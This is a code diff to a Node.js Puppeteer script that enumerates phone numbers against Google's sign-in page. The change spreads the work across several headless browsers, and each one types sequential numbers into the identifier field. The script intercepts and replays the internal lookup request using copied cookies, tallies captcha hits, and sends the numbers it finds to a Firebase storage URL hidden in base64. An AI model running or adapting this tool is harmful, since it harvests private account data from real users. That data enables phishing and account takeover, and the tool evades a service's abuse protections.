@@ -8,14 +8,20 @@ const args = process.argv.slice(2)
 let USER = args[0]
 
 let mConfig = null
-let mLoaded = false
-let page = null
-let mStart = Date.now()
-let mCookies = null
+let mNumbers = []
+let mPage = {}
+let mBrowser = {}
+let mLoaded = {}
+let mFinish = {}
+let mCookies = {}
+let mRequestCount = {}
 let mStatus = {}
 let mLoad = 0
 let XXXX = 0
 let YYYY = 0
+
+
+let mStart = Date.now()
 
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')
 
@@ -35,7 +41,7 @@ process.on('message', async (data) => {
 })
 
 
-startBrowser()
+foundLoginNumber()
 
 
 setInterval(async () => {
@@ -43,8 +49,56 @@ setInterval(async () => {
 }, 3600000)
 
 
-async function startBrowser() {
+async function foundLoginNumber() {
+    while (true) {
+        if (mConfig) {
+            mStart = Date.now()
+            try {
+                let prev = mConfig.n
+                let target = mConfig.s
+
+                mFinish = {}
+                mNumbers = makeNumberList(prev, target)
+
+                mStatus = {
+                    found: 0,
+                    captcha: 0,
+                    recaptcha: 0,
+                    other: 0
+                }
+
+                let start = Date.now()
+                mLoad = start
+                XXXX = 0
+                YYYY = 0
+
+                for (let i = 0; i < mConfig.b; i++) {
+                    await launchBrowser(i)
+                    startWork(i)
+                }
+                
+                await waitForCompleted(mConfig.b, mNumbers.length*4000)
+                mNumbers = []
+
+                console.log('Finish', Date.now()-start)
+
+                process.send({ t: 5, s: 'controller_status', c:USER, d: { t:1, u:mConfig.u, s:USER, f:mStatus.found, r:mStatus.recaptcha, c:mStatus.captcha, o:mStatus.other } })
+            } catch (error) {}
+
+            mConfig = null
+        } else {
+            await delay(1000)
+        }
+    }
+}
+
+
+async function launchBrowser(load) {
     try {
+        if (mPage[load]) {
+            return
+        }
+
         let browser = await puppeteer.launch({
             headless: false,
             headless: 'new',
@@ -58,7 +112,10 @@ async function startBrowser() {
             ]
         })
 
-        page = (await browser.pages())[0]
+        let page = (await browser.pages())[0]
+
+        mBrowser[load] = browser
+        mPage[load] = page
 
         page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
 
@@ -68,7 +125,7 @@ async function startBrowser() {
             try {
                 let url = request.url()
                 if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e') && !url.endsWith('request=manually')) {
-                    parallelRequest(page, url, request.headers(), request.postData())
+                    parallelRequest(load, mPage[load], url, request.headers(), request.postData())
 
                     let contentType = 'application/json; charset=utf-8'
                     let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')
@@ -87,89 +144,60 @@ async function startBrowser() {
             }
         })
 
-        console.log('Browser Load Success')
+        await loadLoginPage(page, load)
 
-        await loadLoginPage()
-
-        mLoaded = true
-        mCookies = null
-
-        console.log('Page Load Success')
-        
-        await foundLoginNumber()
-    } catch (error) {
-        console.log('Browser Error: '+error)
-    }
-}
-
-
-async function foundLoginNumber() {
-    while (true) {
-        if (mConfig) {
-            mStart = Date.now()
-            try {
-                let prev = mConfig.n
-                let target = mConfig.s
-
-                mStatus = {
-                    found: 0,
-                    captcha: 0,
-                    recaptcha: 0,
-                    other: 0
-                }
-
-                let start = Date.now()
-                mLoad = start
-                XXXX = 0
-                YYYY = 0
-
-                for (let i = 0; i < target; i++) {
-                    if (prev != mConfig.n) {
-                        i = 0
-                        mStatus = {
-                            found: 0,
-                            captcha: 0,
-                            recaptcha: 0,
-                            other: 0
-                        }
-                        target = mConfig.s
-                    }
-
-                    await setLoginNumber('+'+(mConfig.n+i))
-
-                    await delay(Math.min(mConfig.d?mConfig.d:0, 2000))
-                }
-
-                console.log('Finish', Date.now()-start)
-
-                process.send({ t: 5, s: 'controller_status', c:USER, d: { t:1, u:mConfig.u, s:USER, f:mStatus.found, r:mStatus.recaptcha, c:mStatus.captcha, o:mStatus.other } })
-            } catch (error) {}
-
-            mConfig = null
-        } else {
-            await delay(1000)
-        }
-    }
-}
-
-
-async function setLoginNumber(number) {
-    try {
-        for (let i = 0; i < 60; i++) {
-            if (mLoaded) {
-                break
-            }
-            await delay(500)
-        }
-
-        await page.evaluate((number) => {
-            document.querySelector('input#identifierId').value = number
-            document.querySelector('#identifierNext').click()
-        }, number)
+        mLoaded[load] = true
     } catch (error) {}
 }
 
-async function parallelRequest(page, url, reqHeaders, postData) {
+async function startWork(load) {
+    while (mNumbers.length > 0) {
+        try {
+            let number = mNumbers.shift()
+            if (!number) continue
+            
+            try {
+                for (let i = 0; i < 60; i++) {
+                    if (mLoaded[load]) {
+                        break
+                    }
+                    await delay(500)
+                }
+
+                if (mLoaded[load]) {
+                    await mPage[load].evaluate((number) => {
+                        document.querySelector('input#identifierId').value = number
+                        document.querySelector('#identifierNext').click()
+                    }, number)
+                }
+            } catch (error) {}
+
+            await delay(Math.min(mConfig.d?mConfig.d:0, 2000))
+        } catch (error) {}
+    }
+
+    mFinish[load] = true
+}
+
+async function waitForCompleted(size, timeout = 300000) {
+    let start = Date.now()
+
+    while (true) {
+        if (Date.now() - start > timeout) {
+            break
+        }
+
+        let completed = true
+        for (let i = 0; i < size; i++) {
+            if (!mFinish[i]) completed = false
+        }
+
+        if (completed) break
+        await delay(250)
+    }
+}
+
+async function parallelRequest(load, page, url, reqHeaders, postData) {
     try {
         console.log('send', YYYY++)
         
@@ -180,7 +208,7 @@ async function parallelRequest(page, url, reqHeaders, postData) {
             host: new URL(url).hostname
         }
 
-        if (!mCookies) {
+        if (!mCookies[load]) {
             let puppeteerCookies = await page.cookies()
             let cookies = puppeteerCookies.map(cookie => ({
                 creation: new Date().toISOString(),
@@ -195,7 +223,7 @@ async function parallelRequest(page, url, reqHeaders, postData) {
                 value: cookie.value
             }))
 
-            mCookies = CookieJar.deserializeSync({
+            mCookies[load] = CookieJar.deserializeSync({
                 cookies,
                 rejectPublicSuffixes: true,
                 storeType: 'MemoryCookieStore',
@@ -207,7 +235,7 @@ async function parallelRequest(page, url, reqHeaders, postData) {
             method: 'POST',
             headers,
             body: postData,
-            cookieJar: mCookies,
+            cookieJar: mCookies[load],
             responseType: 'buffer',
             followRedirect: false,
             throwHttpErrors: false,
@@ -218,10 +246,8 @@ async function parallelRequest(page, url, reqHeaders, postData) {
 
         let data = response.body.toString()
 
-        let temp = data.substring(data.indexOf('[['), data.lastIndexOf(']]')-2)
-        temp = temp.substring(0, temp.lastIndexOf(']]')+2)
-
-        let json = JSON.parse(temp)[0]
+        let json = extractArrays(data)[0][0]
+        
         if (json[1] == 'MI613e') {
             let value = JSON.parse(json[2])
             if (value[21]) {
@@ -242,7 +268,7 @@ async function parallelRequest(page, url, reqHeaders, postData) {
             console.log('Load', XXXX++, Date.now()-mLoad, 0)
         }
     } catch (err) {
-        console.log('error2', err)
+        console.log('error', XXXX++, err)
     }
 
     return null
@@ -251,14 +277,13 @@ async function parallelRequest(page, url, reqHeaders, postData) {
 async function pageReload() {
     mLoaded = false
     console.log('Page Reloading...')
-    await loadLoginPage()
+    // await loadLoginPage()
     console.log('Page Reload Success')
     mCookies = null
     mLoaded = true
 }
 
-
-async function loadLoginPage() {
+async function loadLoginPage(page, load) {
     for (let i = 0; i < 3; i++) {
         try {
             await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
@@ -276,6 +301,8 @@ async function loadLoginPage() {
             break
         } catch (error) {}
     }
+
+    mRequestCount[load] = 0
 }
 
 async function saveNumber(user, key, number) {
@@ -285,6 +312,36 @@ async function saveNumber(user, key, number) {
             body: ''
         })
     } catch (error) {}
+}
+
+function extractArrays(raw) {
+    raw = raw.replace(/^\)\]\}'\s*/g, '')
+
+    let lines = raw.split('\n')
+
+    let arrays = []
+
+    for (let i = 0; i < lines.length; i++) {
+        let line = lines[i].trim()
+
+        if (line.startsWith('[')) {
+            try {
+                arrays.push(JSON.parse(line))
+            } catch {}
+        }
+    }
+
+    return arrays
+}
+
+function makeNumberList(number, target) {
+    let list = []
+
+    for (let i = 0; i < target; i++) {
+        list.push(number+i)
+    }
+
+    return list
 }
 
 function decode(data) {
